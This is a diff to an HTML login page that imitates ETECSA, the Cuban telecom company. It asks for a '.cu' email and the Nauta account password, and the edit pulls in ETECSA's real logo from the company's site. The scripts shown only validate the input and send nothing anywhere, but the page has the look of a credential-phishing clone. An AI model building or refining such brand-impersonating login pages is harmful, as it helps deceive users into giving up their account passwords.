@@ -22,16 +22,27 @@
             background: #003366;
             color: white;
             text-align: center;
-            padding: 15px 0;
+            padding: 10px 0;
             position: fixed;
             top: 0;
             left: 0;
-            z-index: 1000;
             box-shadow: 0 2px 5px rgba(0,0,0,0.2);
         }
 
+        .header .logo {
+            width: 50px;
+            height: 50px;
+            background: url('https://www.etecsa.cu/sites/default/files/logo.png') no-repeat center center;
+            background-size: contain;
+            display: inline-block;
+            vertical-align: middle;
+        }
+
         .header .title {
-            font-size: 24px;
+            display: inline-block;
+            vertical-align: middle;
+            margin-left: 10px;
+            font-size: 20px;
             font-weight: bold;
         }
 
@@ -147,7 +158,8 @@
 </head>
 <body>
     <div class="header">
-        <div class="title">ETECSA</div>
+        <span class="logo"></span>
+        <span class="title">ETECSA</span>
     </div>
     
     <div class="container">
@@ -155,7 +167,7 @@
         <p class="subtitle">Empresa de Telecomunicaciones de Cuba</p>
         <p class="info">Acceder al sistema: Por favor introduzca su <span class="cu-domain">correo .cu</span> y contraseña de su cuenta. Si no tiene cuenta nauta debe dirigirse a las oficinas comerciales.</p>
 
-        <form id="loginForm">
+        <form id="registerForm">
             <div class="input-group">
                 <label for="username">Correo .cu:</label>
                 <input type="text" id="username" placeholder="Introduce tu correo .cu..." required>
@@ -175,14 +187,19 @@
     </div>
 
     <script>
-        document.getElementById('loginForm').addEventListener('submit', function(e) {
+        // Script básico de validación que funciona con tu estructura
+        document.getElementById('registerForm').addEventListener('submit', function(e) {
             e.preventDefault();
             
             const username = document.getElementById('username').value;
             const password = document.getElementById('password').value;
             const messageDiv = document.getElementById('message');
             
-            // Validación simple para correo .cu
+            // Limpiar mensajes anteriores
+            messageDiv.className = 'message';
+            messageDiv.style.display = 'none';
+            
+            // Validación básica
             if (!username.includes('.cu')) {
                 showMessage('Por favor, ingrese un correo .cu válido', 'error');
                 return;
@@ -221,4 +238,4 @@
         }
     </script>
 </body>
-</html>
+                    </html>
